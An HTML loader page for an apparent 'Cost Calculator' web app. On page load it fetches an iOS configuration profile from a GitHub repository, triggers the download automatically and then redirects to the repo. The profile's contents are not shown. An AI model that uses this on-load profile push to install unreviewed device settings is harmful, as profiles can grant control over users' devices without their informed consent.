<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Installing Cost Calculator...</title>
    <style>
        body {
            font-family: -apple-system, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f7;
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #007AFF;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; margin: 0; }
        p { color: #8e8e93; font-size: 14px; }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <h2>Starting Download...</h2>
    <p>Returning to GitHub in a moment.</p>

    <script>
        window.onload = function() {
            const rawUrl = "https://raw.githubusercontent.com/jn5ncjzj7j-byte/Cost-Calculator/refs/heads/main/Webapp/ios.mobileconfig";
            const githubRepo = "https://github.com/jn5ncjzj7j-byte/Cost-Calculator";

            // 1. Fetch and trigger the profile download
            fetch(rawUrl)
                .then(response => response.text())
                .then(xmlData => {
                    const blob = new Blob([xmlData], { type: 'application/x-apple-aspen-config' });
                    const url = window.URL.createObjectURL(blob);
                    
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = 'cost_calculator.mobileconfig';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);

                    // 2. Wait 2 seconds for the "Allow" prompt to appear, then redirect
                    setTimeout(() => {
                        window.location.href = githubRepo;
                    }, 2000);
                })
                .catch(err => {
                    // If error (like not in Safari), go back to GitHub anyway
                    window.location.href = githubRepo;
                });
        };
    </script>
</body>
</html>
